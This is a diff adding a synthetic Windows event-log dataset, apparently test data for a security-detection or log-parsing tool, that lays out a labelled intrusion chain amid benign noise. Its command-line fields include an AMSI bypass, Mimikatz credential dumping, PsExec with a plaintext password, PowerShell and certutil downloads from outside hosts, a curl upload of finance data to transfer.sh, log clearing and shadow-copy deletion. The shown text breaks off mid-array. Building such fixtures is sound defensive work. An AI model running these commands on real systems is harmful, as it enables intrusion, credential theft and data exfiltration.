@@ -1,0 +1,180 @@
+[
+  {"_comment":"=== BLOCK 1: Normal morning noise — lots of benign events with inconsistent fields ==="},
+
+  {"Timestamp":"2024-11-18T06:58:22.001Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"PROD-WEB01","HostIP":"172.16.5.11","UserName":"NT AUTHORITY\\SYSTEM","LogonType":"5","SourceIp":"","Label":"Benign"},
+  {"Timestamp":"2024-11-18T06:58:22.003Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"PROD-WEB01","HostIP":"172.16.5.11","UserName":"NT AUTHORITY\\SYSTEM","LogonType":"5","SourceIp":""},
+
+  {"Timestamp":"2024-11-18T07:00:01.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS10","HostIP":"172.16.10.110","ProcessGuid":"{ws10-a001}","ParentProcessGuid":"{ws10-a000}","Image":"C:\\Windows\\System32\\userinit.exe","ParentImage":"C:\\Windows\\System32\\winlogon.exe","CommandLine":"C:\\Windows\\System32\\userinit.exe","UserName":"ACME\\d.kim","Label":"Benign"},
+  {"Timestamp":"2024-11-18T07:00:02.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS10","HostIP":"172.16.10.110","ProcessGuid":"{ws10-a002}","ParentProcessGuid":"{ws10-a001}","Image":"C:\\Windows\\explorer.exe","ParentImage":"C:\\Windows\\System32\\userinit.exe","CommandLine":"C:\\Windows\\explorer.exe","UserName":"ACME\\d.kim"},
+  {"Timestamp":"2024-11-18T07:00:15.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS10","ProcessGuid":"{ws10-a003}","ParentProcessGuid":"{ws10-a002}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"","UserName":"ACME\\d.kim"},
+
+  {"Timestamp":"2024-11-18T07:01:00.000Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","Computer":"CORP-WS11","UserName":"ACME\\s.park","LogonType":"10","SourceIp":"172.16.10.5","Label":"Benign"},
+  {"Timestamp":"2024-11-18T07:01:05.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b001}","ParentProcessGuid":"{ws11-b000}","Image":"C:\\Windows\\explorer.exe","ParentImage":"C:\\Windows\\System32\\userinit.exe","CommandLine":"C:\\Windows\\explorer.exe","UserName":"ACME\\s.park"},
+
+  {"_comment":"--- Noise: Windows Update + AV scan with partial fields ---"},
+  {"Timestamp":"2024-11-18T07:02:00.000Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS10","ProcessGuid":"{ws10-a004}","ParentProcessGuid":"{ws10-a000}","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv","UserName":"NT AUTHORITY\\SYSTEM"},
+  {"Timestamp":"2024-11-18T07:02:30.000Z","EventID":1,"HostName":"PROD-WEB01","Image":"C:\\Program Files\\Windows Defender\\MsMpEng.exe","CommandLine":"\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"","UserName":"NT AUTHORITY\\SYSTEM"},
+  {"Timestamp":"2024-11-18T07:03:00.100Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS10","ProcessGuid":"{ws10-a003}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","SourceIp":"172.16.10.110","SourcePort":"49221","DestinationIp":"172.16.5.25","DestinationPort":"443","Protocol":"tcp","UserName":"ACME\\d.kim"},
+
+  {"_comment":"=== BLOCK 2: Messy brute force from multiple sources — out of order, field names differ ==="},
+
+  {"TimeCreated":"2024-11-18T07:10:00.111Z","EventCode":"4625","SourceName":"Microsoft-Windows-Security-Auditing","ComputerName":"CORP-DC01","SubjectUserName":"admin","LogonType":"3","IpAddress":"192.168.99.55"},
+  {"Timestamp":"2024-11-18T07:10:01.222Z","EventID":"4625","Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-DC01","HostIP":"172.16.1.10","UserName":"administrator","LogonType":"3","SourceIp":"192.168.99.55"},
+  {"TimeCreated":"2024-11-18T07:10:02.333Z","EventCode":4625,"ComputerName":"CORP-DC01","SubjectUserName":"svc_sql","LogonType":"3","IpAddress":"192.168.99.55"},
+  {"Timestamp":"2024-11-18T07:10:03.444Z","EventID":4625,"HostName":"CORP-DC01","UserName":"ACME\\backup_admin","LogonType":"3","SourceIp":"192.168.99.55"},
+  {"TimeCreated":"2024-11-18T07:10:04.555Z","EventCode":"4625","ComputerName":"CORP-DC01","SubjectUserName":"ACME\\krbtgt","LogonType":"3","IpAddress":"192.168.99.55"},
+  {"Timestamp":"2024-11-18T07:10:05.666Z","EventID":4625,"HostName":"CORP-DC01","UserName":"domain_admin","LogonType":"3","SourceIp":"192.168.99.55"},
+  {"TimeCreated":"2024-11-18T07:10:06.777Z","EventCode":"4625","ComputerName":"CORP-DC01","SubjectUserName":"sa","LogonType":"3","IpAddress":"192.168.99.55"},
+  {"Timestamp":"2024-11-18T07:10:07.888Z","EventID":4625,"HostName":"CORP-DC01","UserName":"ACME\\j.smith","LogonType":"3","SourceIp":"192.168.99.55"},
+
+  {"_comment":"--- Brute force SUCCESS after enumeration ---"},
+  {"Timestamp":"2024-11-18T07:10:15.100Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-DC01","HostIP":"172.16.1.10","UserName":"ACME\\svc_sql","LogonType":"3","SourceIp":"192.168.99.55","LogonId":"0xABC123"},
+
+  {"_comment":"=== BLOCK 3: Initial access — phishing attachment, MISSING parent process info ==="},
+
+  {"Timestamp":"2024-11-18T07:15:00.000Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b002}","ParentProcessGuid":"{ws11-b001}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\s.park\\Downloads\\Resume_J_Smith_2024.docm\"","UserName":"ACME\\s.park","Label":"Malicious","MITRE_TechniqueId":"T1204.002"},
+
+  {"_comment":"--- Macro spawns wscript, but parent info is ABSENT (common in real SIEM gaps) ---"},
+  {"Timestamp":"2024-11-18T07:15:05.500Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b003}","Image":"C:\\Windows\\System32\\wscript.exe","CommandLine":"wscript.exe //B //Nologo \"C:\\Users\\s.park\\AppData\\Local\\Temp\\~WRD0001.vbs\"","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1059.005"},
+
+  {"_comment":"--- Network callback — partial fields, no process name ---"},
+  {"Timestamp":"2024-11-18T07:15:08.100Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b003}","SourceIp":"172.16.10.111","SourcePort":"50100","DestinationIp":"45.33.32.156","DestinationPort":"8443","Protocol":"tcp"},
+
+  {"_comment":"=== BLOCK 4: Fileless C2 beacon — ENCODED powershell, no hash, MITRE IDs in DIFFERENT format ==="},
+
+  {"Timestamp":"2024-11-18T07:15:12.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b004}","ParentProcessGuid":"{ws11-b003}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Windows\\System32\\wscript.exe","CommandLine":"powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjADIALgBlAHYAaQBsAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA","UserName":"ACME\\s.park","Hashes":"SHA256=","MITRE_TechniqueId":"T1059.001"},
+
+  {"Timestamp":"2024-11-18T07:15:15.600Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceIp":"172.16.10.111","SourcePort":"50200","DestinationIp":"198.51.100.77","DestinationPort":"443","Protocol":"tcp","UserName":"ACME\\s.park"},
+
+  {"_comment":"--- AMSI bypass — obfuscated string with format operator (real evasion technique) ---"},
+  {"Timestamp":"2024-11-18T07:16:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b005}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -c \"[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType((\\\"{5}{2}{0}{1}{3}{6}{4}\\\" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField((\\\"{1}{2}{0}\\\" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags](\\\"{4}{2}{3}{0}{1}\\\" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)\"","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1562.001"},
+
+  {"_comment":"=== BLOCK 5: Discovery spray — lots of recon commands, SOME with truncated cmdline ==="},
+
+  {"Timestamp":"2024-11-18T07:20:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b006}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"cmd.exe /c whoami /all","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1033"},
+  {"Timestamp":"2024-11-18T07:20:01.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b007}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\net.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"net user /domain","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1087.002"},
+  {"Timestamp":"2024-11-18T07:20:02.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b008}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\net.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"net group \"Domain Admins\" /domain","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1069.002"},
+  {"Timestamp":"2024-11-18T07:20:03.400Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b009}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\nltest.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"nltest /dclist:acme.local","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1018"},
+  {"Timestamp":"2024-11-18T07:20:05.500Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b010}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\ipconfig.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"ipconfig /all","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1016"},
+  {"Timestamp":"2024-11-18T07:20:06.600Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b011}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\systeminfo.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"systeminfo","UserName":"ACME\\s.park"},
+
+  {"_comment":"--- netstat with TRUNCATED cmdline (common in real EDR exports) ---"},
+  {"Timestamp":"2024-11-18T07:20:07.700Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b012}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\NETSTAT.EXE","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"netstat -an","UserName":"ACME\\s.park"},
+
+  {"_comment":"--- More noise: benign scheduled tasks on unrelated hosts ---"},
+  {"Timestamp":"2024-11-18T07:20:10.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"PROD-WEB01","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /Run /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"","UserName":"NT AUTHORITY\\SYSTEM"},
+  {"Timestamp":"2024-11-18T07:21:00.000Z","EventID":3,"HostName":"PROD-WEB01","Image":"C:\\Windows\\System32\\svchost.exe","SourceIp":"172.16.5.11","DestinationIp":"20.190.159.0","DestinationPort":"443","Protocol":"tcp"},
+
+  {"_comment":"=== BLOCK 6: Credential harvesting — Mimikatz RENAMED to a.exe, PARTIAL log ==="},
+
+  {"Timestamp":"2024-11-18T07:30:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b013}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Users\\s.park\\AppData\\Local\\Temp\\a.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"a.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit","UserName":"ACME\\s.park","Hashes":"SHA256=CAFEBABE0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF01234567","MITRE_TechniqueId":"T1003.001","AttackScenario":"Credential_Dumping"},
+
+  {"_comment":"--- Mimikatz drops output file — event is missing UserName ---"},
+  {"Timestamp":"2024-11-18T07:30:05.200Z","EventID":11,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b013}","Image":"C:\\Users\\s.park\\AppData\\Local\\Temp\\a.exe","TargetObject":"C:\\Users\\s.park\\AppData\\Local\\Temp\\mimi_out.txt","ActionType":"FileCreate"},
+
+  {"_comment":"=== BLOCK 7: Lateral movement — PSExec + WMI, DUPLICATE events (real SIEM artifact) ==="},
+
+  {"Timestamp":"2024-11-18T07:35:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b014}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Users\\s.park\\AppData\\Local\\Temp\\PsExec64.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"PsExec64.exe \\\\CORP-DC01 -u ACME\\svc_sql -p Summer2024! -s cmd.exe /c \"powershell -nop -w hidden -enc aQBlAHgAIAA=\"","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1570","AttackScenario":"Lateral_PsExec"},
+
+  {"_comment":"--- EXACT DUPLICATE of above (real log duplication) ---"},
+  {"Timestamp":"2024-11-18T07:35:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b014}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Users\\s.park\\AppData\\Local\\Temp\\PsExec64.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"PsExec64.exe \\\\CORP-DC01 -u ACME\\svc_sql -p Summer2024! -s cmd.exe /c \"powershell -nop -w hidden -enc aQBlAHgAIAA=\"","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1570","AttackScenario":"Lateral_PsExec"},
+
+  {"_comment":"--- PsExec network connection ---"},
+  {"Timestamp":"2024-11-18T07:35:02.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b014}","Image":"C:\\Users\\s.park\\AppData\\Local\\Temp\\PsExec64.exe","SourceIp":"172.16.10.111","SourcePort":"50500","DestinationIp":"172.16.1.10","DestinationPort":"445","Protocol":"tcp"},
+
+  {"_comment":"--- DC-side: incoming PsExec creates PSEXESVC (common artifact) ---"},
+  {"Timestamp":"2024-11-18T07:35:05.100Z","EventID":7045,"Provider":"Service Control Manager","HostName":"CORP-DC01","HostIP":"172.16.1.10","Image":"","CommandLine":"%SystemRoot%\\PSEXESVC.exe","UserName":"ACME\\svc_sql","MITRE_TechniqueId":"T1543.003","AttackScenario":"Lateral_PsExec"},
+
+  {"Timestamp":"2024-11-18T07:35:06.500Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-DC01","HostIP":"172.16.1.10","ProcessGuid":"{dc01-c001}","Image":"C:\\Windows\\PSEXESVC.exe","CommandLine":"C:\\Windows\\PSEXESVC.exe","UserName":"NT AUTHORITY\\SYSTEM"},
+
+  {"Timestamp":"2024-11-18T07:35:08.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-DC01","HostIP":"172.16.1.10","ProcessGuid":"{dc01-c002}","ParentProcessGuid":"{dc01-c001}","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Windows\\PSEXESVC.exe","CommandLine":"cmd.exe /c \"powershell -nop -w hidden -enc aQBlAHgAIAA=\"","UserName":"ACME\\svc_sql"},
+
+  {"_comment":"=== BLOCK 8: WMI lateral movement to file server (another method, MIXED with benign WMI) ==="},
+
+  {"Timestamp":"2024-11-18T07:40:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b015}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"wmic /node:\"CORP-FS01\" process call create \"cmd /c powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/stage2.ps1')\"","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1047","AttackScenario":"Lateral_WMI"},
+
+  {"_comment":"--- Benign WMI noise on unrelated host (decoy) ---"},
+  {"Timestamp":"2024-11-18T07:40:05.000Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS10","ProcessGuid":"{ws10-a005}","ParentProcessGuid":"{ws10-a004}","Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"wmic os get caption,version","UserName":"NT AUTHORITY\\SYSTEM"},
+
+  {"_comment":"--- FS01 side: incoming WMI spawns cmd+PS (some fields missing) ---"},
+  {"Timestamp":"2024-11-18T07:40:10.100Z","EventID":1,"HostName":"CORP-FS01","ProcessGuid":"{fs01-d001}","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/stage2.ps1')","UserName":"ACME\\s.park"},
+
+  {"Timestamp":"2024-11-18T07:40:12.300Z","EventID":3,"HostName":"CORP-FS01","ProcessGuid":"{fs01-d001}","SourceIp":"172.16.5.50","DestinationIp":"198.51.100.77","DestinationPort":"80","Protocol":"tcp"},
+
+  {"_comment":"=== BLOCK 9: Persistence — Scheduled task + Registry run key on DC, FIELD NAMES VARY ==="},
+
+  {"Timestamp":"2024-11-18T07:45:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-DC01","HostIP":"172.16.1.10","ProcessGuid":"{dc01-c003}","ParentProcessGuid":"{dc01-c002}","Image":"C:\\Windows\\System32\\schtasks.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"schtasks /create /sc minute /mo 30 /tn \"\\Microsoft\\Windows\\SystemRestore\\SR\" /tr \"powershell.exe -nop -w hidden -enc YwBhAGwAYwAuAGUAeABlAA==\" /ru SYSTEM /f","UserName":"ACME\\svc_sql","MITRE_TechniqueId":"T1053.005","AttackScenario":"Persistence_ScheduledTask"},
+
+  {"_comment":"--- Registry persistence via non-standard field names (ECS style) ---"},
+  {"@timestamp":"2024-11-18T07:46:00.100Z","event.code":"13","host.name":"CORP-DC01","process.name":"powershell.exe","process.command_line":"powershell.exe -c Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsDefenderUpdate' -Value 'C:\\Windows\\Temp\\updater.exe'","user.name":"ACME\\svc_sql","rule.mitre.id":"T1547.001"},
+
+  {"_comment":"=== BLOCK 10: DCSync attack — EVENT 4662, some fields missing/garbled ==="},
+
+  {"Timestamp":"2024-11-18T07:50:00.100Z","EventID":4662,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-DC01","HostIP":"172.16.1.10","UserName":"ACME\\svc_sql","Properties":"{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}","ObjectType":"19195a5b-6da0-11d0-afd3-00c04fd930c6","AccessMask":"0x100","CommandLine":"lsass.exe","MITRE_TechniqueId":"T1003.006","AttackScenario":"DCSync"},
+
+  {"Timestamp":"2024-11-18T07:50:00.300Z","EventID":4662,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-DC01","UserName":"ACME\\svc_sql","Properties":"{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}","AccessMask":"0x100","CommandLine":"lsass.exe","MITRE_TechniqueId":"T1003.006"},
+
+  {"_comment":"=== BLOCK 11: Data exfiltration — CERTUTIL + BITSAdmin with progressively missing data ==="},
+
+  {"Timestamp":"2024-11-18T08:00:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-FS01","HostIP":"172.16.5.50","ProcessGuid":"{fs01-d002}","ParentProcessGuid":"{fs01-d001}","Image":"C:\\Windows\\System32\\certutil.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"certutil.exe -urlcache -split -f http://198.51.100.77/beacon.exe C:\\Windows\\Temp\\svc.exe","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1140","AttackScenario":"LOLBAS_Download"},
+
+  {"Timestamp":"2024-11-18T08:00:05.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-DC01","ProcessGuid":"{dc01-c004}","Image":"C:\\Windows\\System32\\bitsadmin.exe","CommandLine":"bitsadmin /transfer updater /priority high http://198.51.100.77/exfil_tool.exe C:\\Windows\\Temp\\exfil.exe","UserName":"ACME\\svc_sql","MITRE_TechniqueId":"T1197"},
+
+  {"_comment":"--- Exfil attempt: compress and upload — uses 7z, then curl, NO MITRE tag ==="},
+  {"Timestamp":"2024-11-18T08:05:00.100Z","EventID":1,"HostName":"CORP-FS01","ProcessGuid":"{fs01-d003}","Image":"C:\\Users\\s.park\\AppData\\Local\\Temp\\7z.exe","CommandLine":"7z.exe a -pP@ssw0rd! C:\\Windows\\Temp\\data.7z C:\\FileShare\\Finance\\*","UserName":"ACME\\s.park"},
+
+  {"Timestamp":"2024-11-18T08:05:30.200Z","EventID":1,"HostName":"CORP-FS01","ProcessGuid":"{fs01-d004}","ParentProcessGuid":"{fs01-d003}","Image":"C:\\Windows\\System32\\curl.exe","CommandLine":"curl.exe -X POST -F \"file=@C:\\Windows\\Temp\\data.7z\" https://transfer.sh/upload","UserName":"ACME\\s.park"},
+  {"Timestamp":"2024-11-18T08:05:32.400Z","EventID":3,"HostName":"CORP-FS01","ProcessGuid":"{fs01-d004}","SourceIp":"172.16.5.50","DestinationIp":"144.76.136.153","DestinationPort":"443","Protocol":"tcp"},
+
+  {"_comment":"=== BLOCK 12: Cleanup/anti-forensics — event log clearing, timestomping ==="},
+
+  {"Timestamp":"2024-11-18T08:10:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b016}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\wevtutil.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"wevtutil.exe cl Security","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1070.001"},
+  {"Timestamp":"2024-11-18T08:10:05.200Z","EventID":1104,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-WS11","UserName":"ACME\\s.park"},
+
+  {"_comment":"--- Shadow copy deletion (ransomware prep, or cleanup?) ---"},
+  {"Timestamp":"2024-11-18T08:10:10.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-DC01","ProcessGuid":"{dc01-c005}","Image":"C:\\Windows\\System32\\vssadmin.exe","CommandLine":"vssadmin delete shadows /all /quiet","UserName":"ACME\\svc_sql","MITRE_TechniqueId":"T1490"},
+
+  {"_comment":"=== BLOCK 13: Late noise — more normal activity interleaved (realistic SOC timeline) ==="},
+
+  {"Timestamp":"2024-11-18T08:15:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS10","ProcessGuid":"{ws10-a006}","ParentProcessGuid":"{ws10-a002}","Image":"C:\\Windows\\System32\\notepad.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"notepad.exe","UserName":"ACME\\d.kim"},
+
+  {"Timestamp":"2024-11-18T08:20:00.100Z","EventID":4634,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-WS10","UserName":"ACME\\d.kim","LogonId":"0x1234AA"},
+
+  {"_comment":"--- Garbled event: corrupt timestamp (real data quality issue) ---"},
+  {"Timestamp":"N/A","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"PROD-WEB01","Image":"C:\\Windows\\System32\\conhost.exe","CommandLine":"conhost.exe 0x4","UserName":"NT AUTHORITY\\SYSTEM"},
+
+  {"_comment":"--- Event with ONLY raw field (non-JSON line that was rescued) ---"},
+  {"Timestamp":"2024-11-18T08:25:00.000Z","raw":"Nov 18 08:25:00 PROD-WEB01 kernel: [UFW BLOCK] IN=eth0 SRC=192.168.99.55 DST=172.16.5.11 PROTO=TCP SPT=44891 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0"},
+
+  {"_comment":"--- Event with NULL/empty critical fields ---"},
+  {"Timestamp":"2024-11-18T08:28:00.000Z","EventID":"","Provider":"","HostName":"","Image":"","CommandLine":"","UserName":""},
+
+  {"_comment":"=== BLOCK 14: MSHTA living-off-the-land (LOLBAS) ==="},
+
+  {"Timestamp":"2024-11-18T07:50:30.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","HostIP":"172.16.10.111","ProcessGuid":"{ws11-b017}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\mshta.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -f C:\\Windows\\Temp\\payload.ps1\"\", 0:close\")","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1218.005","AttackScenario":"LOLBAS_MSHTA"},
+
+  {"_comment":"=== BLOCK 15: Kerberoasting (T1558.003) — mixed field formats ==="},
+
+  {"TimeCreated":"2024-11-18T07:48:00.100Z","EventCode":"4769","ComputerName":"CORP-DC01","TargetUserName":"ACME\\svc_sql","SourceIp":"172.16.10.111","LogonType":"","SubjectUserName":"ACME\\s.park"},
+
+  {"Timestamp":"2024-11-18T07:48:05.000Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"CORP-WS11","ProcessGuid":"{ws11-b018}","ParentProcessGuid":"{ws11-b004}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/CORP-DB01.acme.local:1433'\"","UserName":"ACME\\s.park","MITRE_TechniqueId":"T1558.003"},
+
+  {"_comment":"=== BLOCK 16: Golden ticket style persistence — event from FUTURE (clock skew / timezone error) ==="},
+
+  {"Timestamp":"2024-11-19T02:00:00.100Z","EventID":4768,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-DC01","UserName":"ACME\\krbtgt","SourceIp":"172.16.10.111","LogonType":""},
+
+  {"_comment":"=== BLOCK 17: Incomplete multi-line events (partial parsing artifacts) ==="},
+
